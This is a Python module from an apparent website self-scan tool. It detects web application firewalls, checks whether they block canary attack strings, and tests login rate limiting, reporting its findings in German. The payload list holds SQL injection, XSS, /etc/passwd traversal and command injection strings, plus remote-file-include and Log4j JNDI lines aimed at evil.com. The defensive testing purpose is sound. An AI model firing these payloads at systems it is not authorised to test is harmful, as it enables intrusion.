"""Firewall / WAF behavior analysis.

Tests how the target responds to suspicious traffic patterns:

1. WAF Detection — identify the WAF vendor from response headers and
   block pages (Cloudflare, AWS WAF, ModSecurity, Sucuri, Imperva, F5, etc.)
2. Block Threshold — send requests with progressively suspicious payloads
   (SQL injection canaries, XSS canaries, path traversal) and measure
   at which point the WAF intervenes (403/406/429/503).
3. Rate Limiting — rapid-fire 15 requests to login/API endpoints (moved
   here from rate_limit_test.py since it's part of the same "aggressive" bucket).
4. Response Timing — measure if certain payload patterns cause significantly
   longer response times (indication of backend processing = no WAF filtering).

Gated behind the "Aggressive Tests" checkbox because all of these WILL
trigger IDS/IPS/WAF alerts on properly configured systems.
"""
from __future__ import annotations

import time
from typing import Callable

import httpx

from app.scanners.base import Finding, ScanResult, Severity

USER_AGENT = "MVZ-SelfScan/1.0 (+https://scan.zdkg.de)"
TIMEOUT = 6.0

# WAF fingerprints: (header_name, header_value_contains, waf_name)
WAF_HEADERS: list[tuple[str, str, str]] = [
    ("server", "cloudflare", "Cloudflare"),
    ("cf-ray", "", "Cloudflare"),
    ("x-sucuri-id", "", "Sucuri"),
    ("x-sucuri-cache", "", "Sucuri"),
    ("server", "sucuri", "Sucuri"),
    ("x-cdn", "imperva", "Imperva Incapsula"),
    ("x-iinfo", "", "Imperva Incapsula"),
    ("server", "bigip", "F5 BIG-IP"),
    ("x-cnection", "", "F5 BIG-IP"),
    ("server", "awselb", "AWS ELB/WAF"),
    ("x-amzn-requestid", "", "AWS"),
    ("x-amz-cf-id", "", "AWS CloudFront"),
    ("server", "akamaighost", "Akamai"),
    ("x-akamai-transformed", "", "Akamai"),
    ("server", "barracuda", "Barracuda WAF"),
    ("server", "denyall", "DenyAll WAF"),
    ("x-powered-by-plesk", "", "Plesk"),
    ("server", "mod_security", "ModSecurity"),
    ("server", "apachegeneric", "ModSecurity"),
]

# Payloads to test WAF block threshold — ordered from mild to severe.
# We DON'T actually exploit anything — these are canary strings that
# a WAF should block on sight.
WAF_CANARY_PAYLOADS: list[tuple[str, str]] = [
    ("sqli_basic", "?id=1' OR '1'='1"),
    ("sqli_union", "?id=1 UNION SELECT 1,2,3--"),
    ("xss_basic", "?q=<script>alert(1)</script>"),
    ("xss_img", "?q=<img src=x onerror=alert(1)>"),
    ("path_traversal", "/../../etc/passwd"),
    ("path_traversal_encoded", "/%2e%2e/%2e%2e/etc/passwd"),
    ("rfi", "?file=http://evil.com/shell.php"),
    ("cmd_injection", "?cmd=;cat+/etc/passwd"),
    ("log4j", "?x=${jndi:ldap://evil.com/a}"),
]

# Endpoints to test rate limiting
RATE_LIMIT_ENDPOINTS = ("/login", "/api/login", "/api/auth", "/api/token", "/wp-login.php")
BURST_SIZE = 15


def _detect_waf(headers: dict) -> list[str]:
    """Identify WAF vendor(s) from response headers."""
    detected: list[str] = []
    seen: set[str] = set()
    for hdr_name, hdr_contains, waf_name in WAF_HEADERS:
        if waf_name in seen:
            continue
        val = headers.get(hdr_name, "").lower()
        if hdr_contains:
            if hdr_contains in val:
                detected.append(waf_name)
                seen.add(waf_name)
        elif val:
            detected.append(waf_name)
            seen.add(waf_name)
    return detected


def check_firewall(domain: str, result: ScanResult, step: Callable[[str, int], None]) -> None:
    step("Firewall / WAF Analyse", 78)

    with httpx.Client(
        timeout=TIMEOUT,
        follow_redirects=False,
        headers={"User-Agent": USER_AGENT},
    ) as client:
        # --- 1. WAF Detection from normal response ---
        waf_vendors: list[str] = []
        try:
            r = client.get(f"https://{domain}/")
            hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
            waf_vendors = _detect_waf(hdrs)
        except httpx.HTTPError:
            pass

        # --- 2. Canary payload block threshold ---
        blocked_at: list[dict] = []
        passed: list[dict] = []

        for payload_name, payload in WAF_CANARY_PAYLOADS:
            url = f"https://{domain}{payload}" if payload.startswith("/") else f"https://{domain}/{payload}"
            try:
                start = time.monotonic()
                r = client.get(url)
                elapsed = round(time.monotonic() - start, 3)
            except httpx.HTTPError:
                blocked_at.append({"payload": payload_name, "status": "connection_error"})
                continue

            if r.status_code in (403, 406, 429, 503):
                blocked_at.append({"payload": payload_name, "status": r.status_code, "time_s": elapsed})
            else:
                passed.append({"payload": payload_name, "status": r.status_code, "time_s": elapsed})

        # --- 3. Rate limiting on login/API endpoints ---
        rate_limit_results: list[dict] = []
        for ep in RATE_LIMIT_ENDPOINTS:
            statuses: list[int] = []
            try:
                for _ in range(BURST_SIZE):
                    r = client.get(f"https://{domain}{ep}")
                    statuses.append(r.status_code)
            except httpx.HTTPError:
                continue
            if not statuses:
                continue
            got_429 = 429 in statuses
            is_sensitive = any(kw in ep for kw in ("login", "auth", "token"))
            rate_limit_results.append({
                "endpoint": ep,
                "rate_limited": got_429,
                "sensitive": is_sensitive,
                "statuses": statuses,
            })

    # Behavioral WAF detection: if multiple canary payloads get 403/406/429/503,
    # some WAF/filter IS active even if we couldn't fingerprint the vendor.
    behavioral_waf = len(blocked_at) >= 3

    # --- Store results ---
    result.metadata["firewall_test"] = {
        "waf_detected": waf_vendors,
        "waf_behavioral": behavioral_waf,
        "canary_blocked": len(blocked_at),
        "canary_passed": len(passed),
        "blocked_payloads": blocked_at,
        "passed_payloads": passed,
        "rate_limit_results": rate_limit_results,
    }

    # --- Emit findings ---

    # WAF detection — three outcomes, no contradictions:
    if waf_vendors:
        # If the vendor is detected but NO payloads got blocked, the WAF is present
        # but permissive. Reflect that in the message so it doesn't read as a clean win.
        if passed and not blocked_at:
            result.add(Finding(
                id="firewall.waf_permissive",
                title=f"WAF erkannt ({', '.join(waf_vendors)}) aber permissiv konfiguriert",
                description=(
                    f"Header-Fingerprint weist auf {', '.join(waf_vendors)} hin, aber keine der "
                    f"{len(passed)} Canary-Payloads (SQLi, XSS, Path-Traversal, RFI, CMD-Injection, Log4j) "
                    "wurde geblockt. Die WAF ist aktiv, filtert aber keine bekannten Angriffsmuster — "
                    "typisch für Rate-Limiting-only-Setups oder WAFs die nur DDoS abfangen."
                ),
                severity=Severity.MEDIUM,
                category="Firewall",
                evidence={"waf_vendors": waf_vendors, "passed_payloads": passed},
                recommendation=(
                    f"{', '.join(waf_vendors)} Regelwerk auf OWASP Core Rule Set (CRS) umstellen "
                    "bzw. bei Cloudflare 'Managed Rules' aktivieren."
                ),
            ))
        else:
            result.add(Finding(
                id="firewall.waf_detected",
                title=f"WAF erkannt: {', '.join(waf_vendors)}",
                description=(
                    f"Die Website wird durch eine Web Application Firewall geschützt: "
                    f"{', '.join(waf_vendors)}. Das ist ein positives Signal — Angriffe werden "
                    "auf Netzwerkebene gefiltert bevor sie die Anwendung erreichen."
                ),
                severity=Severity.INFO,
                category="Firewall",
                evidence={"waf_vendors": waf_vendors},
            ))
    elif behavioral_waf:
        # Active filter observed but no vendor fingerprint — custom WAF, ModSecurity
        # without Server header, or provider-level filtering.
        result.add(Finding(
            id="firewall.waf_behavioral",
            title=f"WAF-Verhalten erkannt (Vendor unbekannt) — {len(blocked_at)} Payloads blockiert",
            description=(
                f"In den Response-Headern ließ sich kein bekannter WAF-Anbieter identifizieren, "
                f"ABER {len(blocked_at)} von {len(blocked_at)+len(passed)} Canary-Payloads wurden mit "
                "HTTP 403/406/429/503 blockiert. Das deutet auf eine aktive Web-Application-Firewall hin, "
                "vermutlich ein custom ModSecurity-Setup, provider-seitige Filter (z.B. GoDaddy DPS, "
                "Hetzner Firewall) oder eine WAF ohne charakteristische Response-Header."
            ),
            severity=Severity.INFO,
            category="Firewall",
            evidence={"blocked_count": len(blocked_at), "passed_count": len(passed)},
        ))
    else:
        result.add(Finding(
            id="firewall.no_waf_detected",
            title="Keine WAF erkannt",
            description=(
                "Weder Response-Header noch das Verhalten bei Canary-Payloads deuten auf eine "
                "Web-Application-Firewall hin. Ohne WAF treffen SQL-Injection, XSS und "
                "Path-Traversal-Payloads direkt auf die Anwendung — die letzte Verteidigungslinie "
                "ist die Eingabevalidierung im Code."
            ),
            severity=Severity.MEDIUM,
            category="Firewall",
            recommendation=(
                "WAF einsetzen: Cloudflare Free (kostenlos), AWS WAF, ModSecurity, oder "
                "managed via Hetzner Firewall. Für MVZ-Websites ist eine WAF Stand der Technik."
            ),
        ))

    # Canary block analysis
    # When a WAF vendor was detected AND all payloads passed, we already emitted
    # firewall.waf_permissive — skip the duplicate "no payload blocked" finding.
    if passed and not blocked_at and not waf_vendors:
        result.add(Finding(
            id="firewall.no_payload_blocked",
            title=f"Keine der {len(passed)} Test-Payloads wurde blockiert",
            description=(
                "SQLi-, XSS-, Path-Traversal-, RFI-, Command-Injection- und Log4j-Canary-"
                "Strings wurden alle mit HTTP 200 beantwortet. Entweder gibt es keine WAF, "
                "oder die WAF-Regeln sind zu permissiv. Das bedeutet: echte Angriffs-Payloads "
                "erreichen die Anwendung ungehindert."
            ),
            severity=Severity.HIGH,
            category="Firewall",
            evidence={"passed": passed},
            recommendation="WAF aktivieren und Regelwerk auf OWASP Core Rule Set (CRS) setzen.",
        ))
    elif blocked_at and passed:
        result.add(Finding(
            id="firewall.partial_block",
            title=f"WAF blockiert {len(blocked_at)}/{len(blocked_at)+len(passed)} Test-Payloads",
            description=(
                f"{len(blocked_at)} Payloads wurden blockiert (gut), aber {len(passed)} kamen "
                "durch. Die WAF-Konfiguration hat Lücken."
            ),
            severity=Severity.MEDIUM,
            category="Firewall",
            evidence={"blocked": blocked_at, "passed": passed},
            recommendation="WAF-Regelwerk prüfen und auf OWASP CRS Level 2+ setzen.",
        ))
    elif blocked_at and not passed:
        result.add(Finding(
            id="firewall.all_blocked",
            title=f"WAF blockiert alle {len(blocked_at)} Test-Payloads",
            description="Alle getesteten Angriffs-Canaries wurden von der WAF abgefangen. Gute Konfiguration.",
            severity=Severity.INFO,
            category="Firewall",
            evidence={"blocked": blocked_at},
        ))

    # Rate limiting
    sensitive_no_limit = [r for r in rate_limit_results if r["sensitive"] and not r["rate_limited"]]
    if sensitive_no_limit:
        result.add(Finding(
            id="firewall.rate_limit_missing",
            title=f"{len(sensitive_no_limit)} Login-/Auth-Endpoint(s) ohne Rate-Limiting",
            description=(
                f"{BURST_SIZE} Requests in Folge auf sensible Endpunkte — kein HTTP 429 zurück. "
                "Ohne Rate-Limiting kann ein Angreifer unbegrenzt Brute-Force-Angriffe fahren."
            ),
            severity=Severity.HIGH,
            category="Firewall",
            evidence={"endpoints": sensitive_no_limit},
            recommendation="Rate-Limiting erzwingen: nginx limit_req_zone, Cloudflare Rate Rules, oder WAF-Policy.",
        ))
